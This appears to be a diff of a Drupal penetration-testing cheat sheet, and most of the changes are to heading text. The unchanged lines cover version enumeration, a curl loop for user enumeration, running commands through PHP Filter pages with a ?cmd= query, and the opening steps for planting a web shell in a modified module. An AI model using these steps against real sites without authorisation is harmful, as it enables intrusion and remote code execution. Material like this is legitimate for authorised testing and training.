@@ -1,9 +1,9 @@
-### **INTRODUCTION**
+### **Introduction**
 
 Drupal is a free and open-source content management system (CMS) used to build and manage websites. It's written in PHP and provides a backend framework for at least 2.3% of all websites worldwide, from personal blogs to corporate, political, and government sites.
 
 
-### **IDENTIFYING JOOMLA VERSION**
+### **Identifying Drupal Version**
 
 1.  View the CHANGELOG.txt file to identify the Drupal version:  
     `http://[DRUPAL-DOMAIN]/CHANGELOG.txt`
@@ -18,7 +18,7 @@ Drupal is a free and open-source content management system (CMS) used to build a
 6.  Nmap, with the http-drupal-enum script, can be used to enumerate Drupal installations  
     `nmap -sV --script http-drupal-enum --script-args http-drupal-enum.basepath=/ http://[DRUPAL-DOMAIN]`
 
-### **USER ENUMERATION TECHNIQUES**
+### **User Enumeration Techniques**
 
 1.  Analyze error messages to identify existing user accounts. Drupal redirects to user pages if the account exists:  
     `for i in {1..10}; do curl -s -o /dev/null -w "%{http_code}" http://[DRUPAL-DOMAIN]/user/$i; done`
@@ -53,15 +53,15 @@ Drupal is a free and open-source content management system (CMS) used to build a
     Look for unique identifiers or username fields in the JSON response.
     
 
-### **PHP CODE EXECUTION IN FILTER MODULE DRUPAL**
+### **PHP Code Execution in Filter Module (Drupal)**
 
-### **STEP 1. ENABLE THE PHP FILTER MODULE**
+#### **Step 1: Enable PHP Filter Module**
 
 1.  Access the module administration panel by navigating to:  
     `http://[DRUPAL-DOMAIN]/#overlay=admin/modules`
 2.  Locate and enable the PHP Filter module, then save the configuration.
 
-### **STEP 2. CREATE A PAGE WITH PHP CODE**
+#### **Step 2: Create a Page with PHP Code**
 
 1.  Navigate to the Content Creation Section:  
     `http://[DRUPAL-DOMAIN]/#overlay=node/add`
@@ -71,19 +71,19 @@ Drupal is a free and open-source content management system (CMS) used to build a
 4.  Save the page. Note the URL of the newly created page, for example:  
     `http://[DRUPAL-DOMAIN]/node/1`
 
-### **STEP 3: EXECUTE COMMANDS ON THE NEW PAGE**
+#### **Step 3: Execute Commands**
 
 1.  To run commands, add a query string with the command you wish to execute, such as:  
     `http://[DRUPAL-DOMAIN]/node/1?cmd=id`
 2.  Or use curl to execute the command from the terminal:  
     `curl 'http://[DRUPAL-DOMAIN]/node/1?cmd=id'`
 
-### **STEP 4: MODIFY AND UPLOAD A MODULE WITH A WEB SHELL**
+### **Modify and Upload Module with Web Shell**
 
 1.  Download a module from Drupal.org, e.g., CAPTCHA:  
     `wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
     
-2. Unzip the file:  
+2. Extract archive:  
     `tar xvf captcha-8.x-1.2.tar.gz`
     
 3. Add a PHP web shell into one of the PHP files:  
